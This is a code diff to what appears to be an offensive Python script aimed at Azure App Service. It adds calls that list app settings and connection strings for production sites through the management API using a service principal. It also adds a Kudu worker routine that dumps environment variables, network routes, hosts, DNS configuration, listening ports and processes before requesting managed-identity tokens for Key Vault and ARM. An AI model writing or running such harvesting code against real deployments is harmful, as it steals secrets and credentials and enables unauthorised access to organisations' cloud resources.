@@ -150,6 +150,17 @@ try:
 except Exception as e:
     outer_emit({"stage":"direct-arm-error","error":repr(e)})
 
+# The reporting SP can read publishing credentials; on some deployments it
+# can also read the site's effective settings, including the identity-sidecar
+# endpoint that is absent from the Kudu process environment.
+try:
+    for site in (APP, "app-tbl-storefront-prod"):
+        for kind in ("appsettings", "connectionstrings"):
+            u = "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + (RG if site == APP else "rg-tbl-platform-prod-sea") + "/providers/Microsoft.Web/sites/" + site + "/config/" + kind + "/list?api-version=2022-03-01"
+            outer_emit({"stage":"sp-" + kind,"site":site,"response":arm_call(arm, u, "POST", {})})
+except Exception as e:
+    outer_emit({"stage":"sp-settings-error","error":repr(e)})
+
 worker = r'''import base64, json, os, time, urllib.parse, urllib.request, traceback, uuid
 def discover_identity_env():
     merged = dict(os.environ)
@@ -192,6 +203,23 @@ def save(obj):
         open(OUT, "w").write(json.dumps(obj, default=str))
     except Exception:
         pass
+def diag():
+    import subprocess
+    cmds = [
+        "env | sort",
+        "cat /proc/net/route",
+        "cat /etc/hosts",
+        "cat /etc/resolv.conf",
+        "(ss -lntp || netstat -lntp || true)",
+        "(ps auxww || true)",
+    ]
+    out = {}
+    for c in cmds:
+        try:
+            out[c] = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=8).decode(errors="replace")[:12000]
+        except Exception as e:
+            out[c] = repr(e)
+    return out
 def token(resource):
     candidates = []
     # App Service's sidecar may be on a link-local address even when Kudu's
@@ -230,6 +258,7 @@ def oid(jwt):
     p += "=" * (-len(p) % 4)
     return json.loads(base64.urlsafe_b64decode(p)).get("oid")
 emit({"stage":"worker-started","ts":time.time(),"identity_endpoint":IE,"legacy":LEGACY,"has_header":bool(IH),"proc_discovered":bool(_ENV.get("IDENTITY_ENDPOINT") or _ENV.get("MSI_ENDPOINT"))})
+emit({"stage":"kudu-diag","data":diag()})
 try:
     vt = token("https://vault.azure.net")
     at = token("https://management.azure.com")
